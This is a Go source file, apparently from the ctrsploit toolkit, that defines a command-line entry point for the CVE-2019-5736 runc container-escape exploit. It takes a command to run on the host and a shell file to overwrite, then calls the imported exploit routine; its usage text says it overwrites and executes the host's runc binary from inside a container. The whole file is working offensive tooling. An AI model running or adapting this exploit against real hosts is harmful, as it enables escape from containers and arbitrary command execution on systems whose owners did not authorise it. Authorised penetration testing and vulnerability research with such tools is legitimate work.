package exploit

import (
	"fmt"
	"github.com/ctrsploit/sploit-spec/pkg/log"

	exploit "github.com/ctrsploit/ctrsploit/exploit/CVE-2019-5736"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
)

var cve_2019_5736_Command = &cli.Command{
	Name:    exploit.ExpName,
	Aliases: []string{"runC", "5736", "CVE-2019-5736", "2019-5736"},
	Usage:   "The exploit works by overwriting and executing the host systems runc binary from within the container.",
	Flags: []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Value: "touch /tmp/ccc", Required: true},
		&cli.StringFlag{Name: "wsh", Aliases: []string{"w"}, Value: "/bin/sh", Usage: "the sh file to overwrite, default is \"/bin/sh\"", Required: false},
		&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Required: false},
	},
	Action: func(context *cli.Context) error {
		cmd := context.String("cmd")
		log.Logger.Info(fmt.Sprintf("Execute command: %s", cmd))
		debug := context.Bool("debug")
		replaceShFileName := context.String("wsh")
		err := exploit.InvokeExploit(cmd, replaceShFileName, debug)
		awesome_error.CheckFatal(err)
		return nil
	},
}
